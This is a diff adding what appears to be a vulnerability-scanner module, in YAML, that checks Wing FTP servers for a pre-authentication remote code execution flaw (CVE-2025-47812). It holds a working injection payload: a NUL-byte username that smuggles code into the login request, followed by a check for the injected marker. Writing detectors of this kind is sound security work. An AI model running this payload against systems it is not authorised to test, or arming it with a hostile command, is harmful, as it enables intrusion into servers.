@@ -1,0 +1,40 @@
+info:
+  name: wing_ftp_cve_2025_47812_rce
+  author: Aryan Kumar
+  severity: 10
+  description: "Pre-Auth RCE in Wing FTP (CVE-2025-47812)"
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2025-47812
+  profiles:
+    - vuln
+    - http
+    - rce
+
+payloads:
+  - library: http
+    steps:
+      - method: post
+        timeout: 7
+        headers:
+          Content-Type: "application/x-www-form-urlencoded"
+        data: "username=anonymous%00]]%0dprint('NETTACKER_RCE_TEST')%0d--&password=anything"
+        url: "{target}/loginok.html"
+        # ADDED THIS TO PREVENT ENGINE CRASH
+        response:
+          condition_type: and
+          conditions:
+            status_code:
+              regex: "^[23]" # Matches 2xx or 3xx responses
+              reverse: false
+
+      - method: get
+        url: "{target}/dir.html"
+        response:
+          condition_type: and
+          conditions:
+            status_code:
+              regex: "200"
+              reverse: false
+            content:
+              regex: "NETTACKER_RCE_TEST"
+              reverse: false
